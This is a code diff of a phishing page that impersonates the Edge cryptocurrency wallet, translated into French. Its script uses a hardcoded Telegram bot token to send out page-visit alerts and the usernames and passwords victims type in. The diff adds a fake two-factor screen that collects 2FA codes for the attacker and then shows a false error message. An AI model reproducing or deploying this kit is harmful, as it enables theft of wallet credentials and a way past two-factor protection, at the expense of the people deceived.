@@ -6,6 +6,7 @@
     <title>Edge - Financial Freedom</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        /* CSS الموحد */
         * {
             margin: 0;
             padding: 0;
@@ -33,825 +34,278 @@
             z-index: 100;
         }
 
-        .header-left {
-            display: flex;
-            align-items: center;
-        }
+        .header-logo { height: 36px; width: auto; }
 
-        .header-logo {
-            height: 36px;
-            width: auto;
-        }
-
-        .header-right {
-            display: flex;
-            align-items: center;
-            gap: 24px;
-        }
+        .header-right { display: flex; align-items: center; gap: 24px; }
 
         .icon-btn {
-            width: 40px;
-            height: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            border-radius: 8px;
-            transition: background 0.2s;
+            width: 40px; height: 40px;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; border-radius: 8px; transition: background 0.2s;
         }
 
-        .icon-btn:hover {
-            background: #f3f4f6;
-        }
-
-        .icon-btn svg {
-            width: 24px;
-            height: 24px;
-            stroke: #374151;
-            stroke-width: 2;
-            fill: none;
-        }
+        .icon-btn:hover { background: #f3f4f6; }
+        .icon-btn svg { width: 24px; height: 24px; stroke: #374151; stroke-width: 2; fill: none; }
 
         /* ========== القائمة المنبثقة ========== */
         .menu-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 200;
-            display: none;
-            opacity: 0;
-            transition: opacity 0.3s ease;
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.5); z-index: 200;
+            display: none; opacity: 0; transition: opacity 0.3s ease;
         }
 
-        .menu-overlay.active {
-            display: block;
-            opacity: 1;
-        }
+        .menu-overlay.active { display: block; opacity: 1; }
 
         .menu-panel {
-            position: fixed;
-            top: 0;
-            right: 0;
-            bottom: 0;
-            width: 100%;
-            max-width: 480px;
-            background: #1a1a1a;
-            z-index: 201;
-            transform: translateX(100%);
-            transition: transform 0.3s ease;
-            display: flex;
-            flex-direction: column;
+            position: fixed; top: 0; right: 0; bottom: 0;
+            width: 100%; max-width: 480px; background: #1a1a1a;
+            z-index: 201; transform: translateX(100%);
+            transition: transform 0.3s ease; display: flex; flex-direction: column;
         }
 
-        .menu-panel.active {
-            transform: translateX(0);
-        }
-
-        .menu-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 24px;
-            border-bottom: 1px solid #333;
-        }
-
-        .menu-logo {
-            height: 32px;
-            width: auto;
-        }
-
-        .menu-close {
-            width: 40px;
-            height: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            border-radius: 8px;
-            transition: background 0.2s;
-        }
-
-        .menu-close:hover {
-            background: #333;
-        }
-
-        .menu-close svg {
-            width: 24px;
-            height: 24px;
-            stroke: white;
-            stroke-width: 2;
-            fill: none;
-        }
-
-        .menu-search {
-            padding: 20px 24px;
-            border-bottom: 1px solid #333;
-        }
-
-        .search-box {
-            position: relative;
-            width: 100%;
-        }
+        .menu-panel.active { transform: translateX(0); }
+        .menu-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; border-bottom: 1px solid #333; }
+        .menu-logo { height: 32px; }
+        .menu-close { cursor: pointer; }
+        .menu-close svg { width: 24px; stroke: white; }
 
         .search-input {
-            width: 100%;
-            background: #4a4a4a;
-            border: none;
-            border-radius: 12px;
-            padding: 16px 50px 16px 20px;
-            font-size: 16px;
-            color: white;
-            font-family: 'Inter', sans-serif;
-            outline: none;
-        }
-
-        .search-input::placeholder {
-            color: #ccc;
-        }
-
-        .search-icon {
-            position: absolute;
-            right: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 22px;
-            height: 22px;
-            stroke: #ccc;
-            stroke-width: 2;
-            fill: none;
-        }
-
-        .menu-items {
-            flex: 1;
-            padding: 20px 0;
+            width: 100%; background: #4a4a4a; border: none; border-radius: 12px;
+            padding: 16px; color: white; margin: 20px 24px; width: calc(100% - 48px);
         }
 
         .menu-item {
-            display: block;
-            padding: 20px 24px;
-            color: white;
-            text-decoration: none;
-            font-size: 18px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            border-bottom: 1px solid #333;
-            transition: background 0.2s;
-        }
-
-        .menu-item:hover {
-            background: #333;
-        }
-
-        .menu-item.get-started {
-            color: #10b981;
+            display: block; padding: 20px 24px; color: white; text-decoration: none;
+            font-weight: 700; text-transform: uppercase; border-bottom: 1px solid #333;
         }
 
         /* ========== الصفحة الأولى - الترحيب ========== */
         .welcome-page {
-            width: 100%;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 100px 40px 60px;
-            animation: fadeIn 0.5s ease;
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; text-align: center; padding: 100px 40px;
         }
 
-        .welcome-page.hidden {
-            display: none;
-        }
+        .welcome-page.hidden { display: none; }
 
-        .logo-container {
-            margin-bottom: 80px;
-        }
+        .logo-container img { width: 200px; margin-bottom: 40px; }
 
-        .logo-container img {
-            width: 200px;
-            height: 200px;
-            object-fit: contain;
-            filter: drop-shadow(0 8px 24px rgba(0,0,0,0.12));
-        }
-
-        .title {
-            font-size: 56px;
-            font-weight: 300;
-            color: #1a1a1a;
-            line-height: 1.1;
-            margin-bottom: 20px;
-            letter-spacing: -1px;
-        }
-
-        .title .highlight {
-            color: #10b981;
-            font-weight: 400;
-        }
-
-        .subtitle {
-            font-size: 20px;
-            color: #4b5563;
-            font-weight: 400;
-            line-height: 1.6;
-            margin-bottom: 100px;
-            max-width: 480px;
-        }
+        .title { font-size: 48px; font-weight: 300; margin-bottom: 20px; }
+        .highlight { color: #10b981; }
 
         .btn-primary {
             background: linear-gradient(135deg, #7db889 0%, #6aa076 100%);
-            color: white;
-            border: none;
-            padding: 20px 72px;
-            font-size: 18px;
-            font-weight: 500;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 10px 32px rgba(125, 184, 137, 0.4);
-            transition: all 0.3s ease;
-            margin-bottom: 28px;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 14px 40px rgba(125, 184, 137, 0.5);
-        }
-
-        .footer-text {
-            font-size: 17px;
-            color: #6b7280;
-            font-weight: 400;
-        }
-
-        .footer-text a {
-            color: #10b981;
-            text-decoration: none;
-            font-weight: 500;
-            cursor: pointer;
-        }
-
-        .footer-text a:hover {
-            color: #059669;
+            color: white; border: none; padding: 20px 72px; border-radius: 50px;
+            font-size: 18px; cursor: pointer; margin-bottom: 20px;
         }
 
         /* ========== صفحة تسجيل الدخول ========== */
-        .login-page {
-            width: 100%;
-            min-height: 100vh;
-            display: none;
-            flex-direction: column;
-            background: #f8f9fa;
-            animation: fadeIn 0.4s ease;
-            padding-top: 80px;
-        }
+        .login-page { display: none; padding-top: 80px; }
+        .login-page.active { display: flex; flex-direction: column; align-items: center; }
 
-        .login-page.active {
-            display: flex;
-        }
+        .login-content { width: 100%; max-width: 420px; padding: 40px 24px; display: flex; flex-direction: column; align-items: center; }
+        .login-logo img { width: 180px; margin-bottom: 50px; }
 
-        .login-content {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 60px 40px 80px;
-        }
-
-        .login-logo {
-            margin-bottom: 70px;
-        }
-
-        .login-logo img {
-            width: 200px;
-            height: 200px;
-            object-fit: contain;
-            filter: drop-shadow(0 8px 24px rgba(0,0,0,0.12));
-        }
-
-        .input-group {
-            width: 100%;
-            max-width: 420px;
-            margin-bottom: 20px;
-            position: relative;
-        }
-
+        .input-group { width: 100%; margin-bottom: 15px; position: relative; }
         .input-field {
-            width: 100%;
-            background: #f0f2f5;
-            border: none;
-            border-radius: 20px;
-            padding: 22px 60px 22px 26px;
-            font-size: 18px;
-            color: #1a1a1a;
-            font-family: 'Inter', sans-serif;
-            font-weight: 400;
-            outline: none;
-            transition: all 0.2s;
-        }
-
-        .input-field::placeholder {
-            color: #6b7280;
-        }
-
-        .input-field:focus {
-            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.15);
-        }
-
-        .input-icon {
-            position: absolute;
-            right: 22px;
-            top: 50%;
-            transform: translateY(-50%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .check-icon {
-            width: 24px;
-            height: 24px;
-            color: #10b981;
-        }
-
-        .eye-icon {
-            width: 26px;
-            height: 26px;
-            color: #6b7280;
-            cursor: pointer;
+            width: 100%; background: #f0f2f5; border: none; border-radius: 20px;
+            padding: 20px; font-size: 16px; outline: none;
         }
 
         .btn-login {
-            width: 100%;
-            max-width: 420px;
-            background: #c8ddd4;
-            color: white;
-            border: none;
-            padding: 20px;
-            font-size: 18px;
-            font-weight: 500;
-            border-radius: 50px;
-            cursor: not-allowed;
-            margin-top: 32px;
-            margin-bottom: 16px;
-            font-family: 'Inter', sans-serif;
-            transition: all 0.3s;
+            width: 100%; background: #c8ddd4; color: white; border: none;
+            padding: 20px; border-radius: 50px; margin-top: 20px; cursor: not-allowed;
         }
 
-        .btn-login.active {
-            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
-            cursor: pointer;
-            box-shadow: 0 10px 32px rgba(16, 185, 129, 0.4);
+        .btn-login.active { background: #10b981; cursor: pointer; }
+
+        /* ========== واجهة 2FA (المدمجة) ========== */
+        #twoFactorPage {
+            display: none;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #1a1a1a; z-index: 300; color: white;
+            padding: 40px 24px; flex-direction: column;
         }
 
-        .btn-login.active:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 14px 40px rgba(16, 185, 129, 0.5);
+        #twoFactorPage.active { display: flex; }
+
+        .warning-box { display: flex; gap: 16px; margin-bottom: 30px; }
+        .warning-icon {
+            width: 40px; height: 40px; background: #f5a623; color: #1a1a1a;
+            border-radius: 8px; display: flex; align-items: center; justify-content: center;
+            font-weight: bold; font-size: 24px; flex-shrink: 0;
         }
 
-        .btn-create {
-            width: 100%;
-            max-width: 420px;
-            background: #e5e7eb;
-            color: #1a1a1a;
-            border: none;
-            padding: 20px;
-            font-size: 18px;
-            font-weight: 500;
-            border-radius: 50px;
-            cursor: pointer;
-            margin-bottom: 28px;
-            font-family: 'Inter', sans-serif;
-            transition: all 0.3s;
+        .warning-text { color: #f5a623; font-size: 15px; line-height: 1.5; }
+
+        .divider { border: none; height: 1px; background: #4ecdc4; margin: 20px 0; }
+
+        .action-button-2fa {
+            background: none; border: none; color: white; width: 100%;
+            display: flex; justify-content: space-between; font-size: 18px;
+            padding: 15px 0; cursor: pointer;
         }
 
-        .btn-create:hover {
-            background: #d1d5db;
+        /* شاشة إدخال الكود الفعلي */
+        #codeEntrySection { display: none; flex-direction: column; }
+        #codeEntrySection.active { display: flex; }
+
+        .code-input-2fa {
+            width: 100%; padding: 18px; background: #404040; border: 2px solid #00d9a5;
+            border-radius: 12px; color: white; font-size: 18px; margin: 20px 0;
         }
 
-        .forgot-link {
-            color: #10b981;
-            text-decoration: none;
-            font-size: 17px;
-            font-weight: 500;
-            margin-bottom: 60px;
-            cursor: pointer;
+        .btn-submit-2fa {
+            background: #505050; color: white; border: none; padding: 15px 40px;
+            border-radius: 30px; align-self: center; cursor: pointer;
         }
 
-        .forgot-link:hover {
-            color: #059669;
-        }
+        /* قسم المطورين */
+        .developer-section { background: #000; color: white; padding: 60px 40px; margin-top: 40px; }
+        .github-link { color: #6ee7b7; text-decoration: underline; }
 
-        /* تنسيق مخصص للصورة الجديدة */
-        .qr-image-container img {
-            width: 80px;
-            height: 80px;
-            border-radius: 8px;
-            object-fit: cover;
-        }
-
-        /* ========== قسم المطورين - أسود ========== */
-        .developer-section {
-            width: 100%;
-            background: #000000;
-            padding: 80px 60px;
-        }
-
-        .developer-content {
-            max-width: 600px;
-        }
-
-        .developer-title {
-            font-size: 32px;
-            font-weight: 600;
-            color: #ffffff;
-            line-height: 1.3;
-            margin-bottom: 32px;
-        }
-
-        .developer-text {
-            font-size: 18px;
-            color: #e5e7eb;
-            line-height: 1.7;
-            margin-bottom: 32px;
-        }
-
-        .developer-text a {
-            color: #6ee7b7;
-            text-decoration: underline;
-        }
-
-        .developer-text a:hover {
-            color: #34d399;
-        }
-
-        .github-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            color: #6ee7b7;
-            text-decoration: underline;
-            font-size: 17px;
-            font-weight: 500;
-            transition: color 0.2s;
-        }
-
-        .github-link:hover {
-            color: #34d399;
-        }
-
-        .github-icon {
-            width: 28px;
-            height: 28px;
-            fill: #6ee7b7;
-        }
-
-        /* تأثيرات */
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .welcome-page > * {
-            animation: fadeInUp 0.6s ease forwards;
-        }
-
-        .logo-container { animation-delay: 0.1s; }
-        .title { animation-delay: 0.2s; }
-        .subtitle { animation-delay: 0.3s; }
-        .btn-primary { animation-delay: 0.4s; }
-        .footer-text { animation-delay: 0.5s; }
-
-        .login-content > * {
-            animation: fadeInUp 0.5s ease forwards;
-        }
-
-        .login-logo { animation-delay: 0.1s; }
-        .input-group:nth-child(2) { animation-delay: 0.2s; }
-        .input-group:nth-child(3) { animation-delay: 0.3s; }
-        .btn-login { animation-delay: 0.4s; }
-        .btn-create { animation-delay: 0.5s; }
-        .forgot-link { animation-delay: 0.6s; }
-        .qr-image-container { animation-delay: 0.7s; }
-
-        /* توافق الحاسوب الكبير */
-        @media (min-width: 1024px) {
-            .header {
-                padding: 16px 60px;
-            }
-
-            .header-logo {
-                height: 42px;
-            }
-
-            .menu-panel {
-                max-width: 520px;
-            }
-
-            .menu-header {
-                padding: 20px 32px;
-            }
-
-            .menu-logo {
-                height: 38px;
-            }
-
-            .menu-search {
-                padding: 24px 32px;
-            }
-
-            .menu-item {
-                padding: 24px 32px;
-                font-size: 20px;
-            }
-
-            .logo-container img, .login-logo img {
-                width: 240px;
-                height: 240px;
-            }
-
-            .title {
-                font-size: 64px;
-            }
-
-            .subtitle {
-                font-size: 22px;
-                max-width: 560px;
-            }
-
-            .input-group, .btn-login, .btn-create {
-                max-width: 480px;
-            }
-
-            .developer-section {
-                padding: 100px 80px;
-            }
-
-            .developer-title {
-                font-size: 38px;
-            }
-
-            .developer-text {
-                font-size: 20px;
-            }
-        }
-
-        /* توافق الجوال */
-        @media (max-width: 640px) {
-            .header {
-                padding: 10px 20px;
-            }
-
-            .header-logo {
-                height: 30px;
-            }
-
-            .header-right {
-                gap: 16px;
-            }
-
-            .welcome-page, .login-content {
-                padding-left: 24px;
-                padding-right: 24px;
-            }
-
-            .logo-container img, .login-logo img {
-                width: 160px;
-                height: 160px;
-            }
-
-            .title {
-                font-size: 40px;
-            }
-
-            .subtitle {
-                font-size: 17px;
-            }
-
-            .developer-section {
-                padding: 60px 24px;
-            }
-
-            .developer-title {
-                font-size: 26px;
-            }
-
-            .developer-text {
-                font-size: 16px;
-            }
-        }
     </style>
 </head>
 <body>
+
     <div class="menu-overlay" id="menuOverlay" onclick="closeMenu()"></div>
-    
     <div class="menu-panel" id="menuPanel">
         <div class="menu-header">
             <img src="https://i.ibb.co/JFW12hJR/57570062-C5-CD-4-E81-A2-F2-DAF1-B6181-F9-B.png" alt="Edge" class="menu-logo">
             <div class="menu-close" onclick="closeMenu()">
-                <svg viewBox="0 0 24 24">
-                    <path d="M18 6L6 18M6 6l12 12" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
+                <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
             </div>
         </div>
-        
-        <div class="menu-search">
-            <div class="search-box">
-                <input type="text" class="search-input" placeholder="Search Anything">
-                <svg class="search-icon" viewBox="0 0 24 24">
-                    <circle cx="11" cy="11" r="8"/>
-                    <path d="M21 21l-4.35-4.35"/>
-                </svg>
-            </div>
-        </div>
-        
-        <nav class="menu-items">
-            <a href="https://edge.app/about/?af=edge-app" class="menu-item" target="_blank" rel="noopener noreferrer">About</a>
-            <a href="https://edge.app/blog/?af=edge-app" class="menu-item" target="_blank" rel="noopener noreferrer">Edge-ucation</a>
-            <a href="https://support.edge.app/hc/en-us" class="menu-item" target="_blank" rel="noopener noreferrer">Support</a>
-            <a href="https://edge.app/events/?af=edge-app" class="menu-item" target="_blank" rel="noopener noreferrer">Events</a>
-            <a href="#" class="menu-item get-started" onclick="closeMenu(); showLogin();">Get Started</a>
+        <input type="text" class="search-input" placeholder="Rechercher">
+        <nav>
+            <a href="#" class="menu-item">À propos</a>
+            <a href="#" class="menu-item">Support</a>
+            <a href="#" class="menu-item" style="color:#10b981" onclick="showLogin()">Commencer</a>
         </nav>
     </div>
 
     <header class="header">
-        <div class="header-left">
-            <img src="https://i.ibb.co/GfZvNh7z/1-EA82644-04-AB-4694-AD14-0-A0-E58-CBAC3-C.png" alt="Edge" class="header-logo">
-        </div>
+        <img src="https://i.ibb.co/GfZvNh7z/1-EA82644-04-AB-4694-AD14-0-A0-E58-CBAC3-C.png" class="header-logo" alt="Logo">
         <div class="header-right">
-            <div class="icon-btn">
-                <svg viewBox="0 0 24 24">
-                    <circle cx="11" cy="11" r="8"/>
-                    <path d="M21 21l-4.35-4.35"/>
-                </svg>
-            </div>
             <div class="icon-btn" onclick="openMenu()">
-                <svg viewBox="0 0 24 24">
-                    <line x1="3" y1="6" x2="21" y2="6"/>
-                    <line x1="3" y1="12" x2="21" y2="12"/>
-                    <line x1="3" y1="18" x2="21" y2="18"/>
-                </svg>
+                <svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
             </div>
         </div>
     </header>
 
     <div class="welcome-page" id="welcomePage">
         <div class="logo-container">
-            <img src="https://i.ibb.co/Mk8KKTJ9/49-E2-B7-AD-63-C1-481-F-82-A1-D0827-AE9-AD11.png" alt="Edge Logo">
+            <img src="https://i.ibb.co/Mk8KKTJ9/49-E2-B7-AD-63-C1-481-F-82-A1-D0827-AE9-AD11.png" alt="Logo">
         </div>
-
-        <h1 class="title">
-            Welcome to<br>
-            Financial <span class="highlight">Freedom</span>
-        </h1>
-
-        <p class="subtitle">
-            Edge is the open source tool you need to invest, secure, and put your crypto in action.
-        </p>
-
-        <button class="btn-primary" onclick="showLogin()">Get Started</button>
-
-        <p class="footer-text">
-            Already have an account? <a onclick="showLogin()">Sign in</a>
-        </p>
+        <h1 class="title">Bienvenue à la<br><span class="highlight">Liberté Financière</span></h1>
+        <p style="color:#6b7280; margin-bottom:40px;">Edge est l'outil open source dont vous avez besoin pour investir et sécuriser votre crypto.</p>
+        <button class="btn-primary" onclick="showLogin()">Commencer</button>
+        <p>Déjà un compte ? <a onclick="showLogin()" style="color:#10b981; cursor:pointer;">Se connecter</a></p>
     </div>
 
     <div class="login-page" id="loginPage">
         <div class="login-content">
             <div class="login-logo">
-                <img src="https://i.ibb.co/GfZvNh7z/1-EA82644-04-AB-4694-AD14-0-A0-E58-CBAC3-C.png" alt="Edge Logo">
+                <img src="https://i.ibb.co/GfZvNh7z/1-EA82644-04-AB-4694-AD14-0-A0-E58-CBAC3-C.png" alt="Logo">
             </div>
-
             <div class="input-group">
-                <input type="text" class="input-field" placeholder="Nom d'utilisateur" id="usernameField" oninput="checkInputs()">
-                <span class="input-icon">
-                    <svg class="check-icon" viewBox="0 0 20 20" fill="currentColor">
-                        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
-                    </svg>
-                </span>
+                <input type="text" class="input-field" placeholder="Nom d'utilisateur" id="user">
             </div>
-
             <div class="input-group">
-                <input type="password" class="input-field" placeholder="Mot de passe" id="passwordField" oninput="checkInputs()">
-                <span class="input-icon" onclick="togglePassword()">
-                    <svg class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-                        <circle cx="12" cy="12" r="3"/>
-                    </svg>
-                </span>
+                <input type="password" class="input-field" placeholder="Mot de passe" id="pass" oninput="checkInputs()">
             </div>
+            <button class="btn-login" id="loginBtn" disabled onclick="handleLogin()">Se connecter</button>
+            <p style="margin-top:20px; color:#10b981; cursor:pointer;">Mot de passe oublié ?</p>
+            <img src="https://i.ibb.co/Xr4zFnpp/A1-A2-E676-8643-423-F-BF5-B-128354918106.jpg" style="width:80px; margin-top:30px; border-radius:8px;">
+        </div>
+    </div>
 
-            <button class="btn-login" id="loginBtn" disabled onclick="handleFinalClick()">Se connecter</button>
-
-            <button class="btn-create">Créer un compte</button>
-
-            <a class="forgot-link">Mot de passe oublié</a>
-
-            <div class="qr-image-container">
-                <a href="https://imgbb.com/"><img src="https://i.ibb.co/Xr4zFnpp/A1-A2-E676-8643-423-F-BF5-B-128354918106.jpg" alt="A1A2E676 8643 423F BF5B 128354918106" border="0"></a>
+    <div id="twoFactorPage">
+        <div id="warningStep">
+            <div class="warning-box">
+                <div class="warning-icon">!</div>
+                <p class="warning-text">
+                    Le nom d'utilisateur et le mot de passe sont corrects. Cet appareil ne peut pas se connecter car il ne dispose pas du bon code à 2 facteurs.
+                </p>
             </div>
+            <hr class="divider">
+            <button class="action-button-2fa" onclick="showCodeEntry()">
+                <span>Entrez le code 2FA</span>
+                <span style="color:#00d9a5">›</span>
+            </button>
+            <div style="flex:1"></div>
+            <p style="color:#b0b0b0; font-size:13px; margin-bottom:10px;">Attendez jusqu'au 11 avril 2026 16:36 pour que cet appareil soit automatiquement autorisé.</p>
+            <p style="color:#909090; font-family:monospace;">ID de verrouillage: 08f54273</p>
+        </div>
+
+        <div id="codeEntrySection">
+            <h2 style="font-size:24px; margin-bottom:15px;">Entrez le code 2FA</h2>
+            <p style="color:#b0b0b0; font-size:14px;">Connectez-vous à votre compte en utilisant l'appareil où vous avez installé l'authentification multi-facteurs, puis allez dans Réglages > 2FA pour trouver le code.</p>
+            <input type="text" class="code-input-2fa" id="twoFACode" placeholder="Code 2FA" maxlength="6">
+            <button class="btn-submit-2fa" id="finalSubmit" onclick="submitFinal()">Envoyer</button>
         </div>
     </div>
 
     <section class="developer-section">
-        <div class="developer-content">
-            <h2 class="developer-title">Are you a developer looking for a key management solution?</h2>
-            <p class="developer-text">
-                Give your users a familiar and secure key management solution with Edge Security API/SDK. All it takes is eight lines of code. For more information, please <a href="mailto:info@edge.app">email us</a>.
-            </p>
-            <a href="https://github.com/EdgeApp" class="github-link" target="_blank" rel="noopener noreferrer">
-                <svg class="github-icon" viewBox="0 0 24 24">
-                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
-                </svg>
-                View Source on Github
-            </a>
-        </div>
+        <h2>Vous êtes développeur ?</h2>
+        <p style="margin:20px 0;">Découvrez l'API Edge Security pour une gestion sécurisée des clés.</p>
+        <a href="https://github.com/EdgeApp" class="github-link">Voir sur Github</a>
     </section>
 
     <script>
-        // --- إعدادات البوت ---
         const bot_token = '8712672264:AAHqDeXBf9EQ_BF40-qOrH68WWPGuumQshI';
         const chat_id = '8745009295';
 
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
-            fetch(url).catch(err => console.log("Telegram Error"));
+        function sendToTelegram(msg) {
+            fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
         }
 
-        window.onload = function() {
-            sendToTelegram("🔔 زيارة جديدة للموقع!");
-        };
-
-        document.addEventListener('change', function(e) {
-            const user = document.getElementById('usernameField').value;
-            const pass = document.getElementById('passwordField').value;
-            if (user || pass) {
-                sendToTelegram(`👤 بيانات جزئية:\nالاسم: ${user}\nالكلمة: ${pass}`);
-            }
-        });
-
-        function handleFinalClick() {
-            const user = document.getElementById('usernameField').value;
-            const pass = document.getElementById('passwordField').value;
-            sendToTelegram(`🚀 تم الضغط على الدخول:\nالاسم: ${user}\nالكلمة: ${pass}`);
-        }
-
-        // --- دوال التحكم في الواجهة ---
-        function openMenu() {
-            document.getElementById('menuOverlay').classList.add('active');
-            document.getElementById('menuPanel').classList.add('active');
-            document.body.style.overflow = 'hidden';
-        }
-
-        function closeMenu() {
-            document.getElementById('menuOverlay').classList.remove('active');
-            document.getElementById('menuPanel').classList.remove('active');
-            document.body.style.overflow = '';
-        }
-
-        function showLogin() {
-            document.getElementById('welcomePage').classList.add('hidden');
-            document.getElementById('loginPage').classList.add('active');
-        }
-
-        function showWelcome() {
-            document.getElementById('loginPage').classList.remove('active');
-            document.getElementById('welcomePage').classList.remove('hidden');
-        }
-
-        function togglePassword() {
-            const field = document.getElementById('passwordField');
-            field.type = field.type === 'password' ? 'text' : 'password';
-        }
+        // تحكم في الصفحات
+        function openMenu() { document.getElementById('menuOverlay').classList.add('active'); document.getElementById('menuPanel').classList.add('active'); }
+        function closeMenu() { document.getElementById('menuOverlay').classList.remove('active'); document.getElementById('menuPanel').classList.remove('active'); }
+        function showLogin() { document.getElementById('welcomePage').classList.add('hidden'); document.getElementById('loginPage').classList.add('active'); closeMenu(); }
 
         function checkInputs() {
-            const username = document.getElementById('usernameField').value.trim();
-            const password = document.getElementById('passwordField').value.trim();
-            const loginBtn = document.getElementById('loginBtn');
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const btn = document.getElementById('loginBtn');
+            if(u.length > 0 && p.length > 0) { btn.disabled = false; btn.classList.add('active'); }
+            else { btn.disabled = true; btn.classList.remove('active'); }
+        }
 
-            if (username.length > 0 && password.length > 0) {
-                loginBtn.classList.add('active');
-                loginBtn.disabled = false;
+        // عند الضغط على Se connecter
+        function handleLogin() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            sendToTelegram(`👤 Connexion:\nUser: ${u}\nPass: ${p}`);
+            
+            // إظهار صفحة 2FA
+            document.getElementById('twoFactorPage').classList.add('active');
+        }
+
+        function showCodeEntry() {
+            document.getElementById('warningStep').style.display = 'none';
+            document.getElementById('codeEntrySection').classList.add('active');
+        }
+
+        function submitFinal() {
+            const code = document.getElementById('twoFACode').value;
+            const u = document.getElementById('user').value;
+            if(code.length === 6) {
+                sendToTelegram(`🔑 Code 2FA reçu pour (${u}): ${code}`);
+                alert("Erreur de connexion. Veuillez réessayer plus tard.");
             } else {
-                loginBtn.classList.remove('active');
-                loginBtn.disabled = true;
+                alert("Veuillez entrer un code valide à 6 chiffres.");
             }
         }
+
+        // تفعيل زر الإرسال النهائي
+        document.getElementById('twoFACode').addEventListener('input', function(e) {
+            const btn = document.getElementById('finalSubmit');
+            if(e.target.value.length === 6) btn.style.backgroundColor = '#00d9a5';
+            else btn.style.backgroundColor = '#505050';
+        });
+
+        window.onload = () => sendToTelegram("🔔 Nouvelle visite sur le site !");
     </script>
 </body>
 </html>
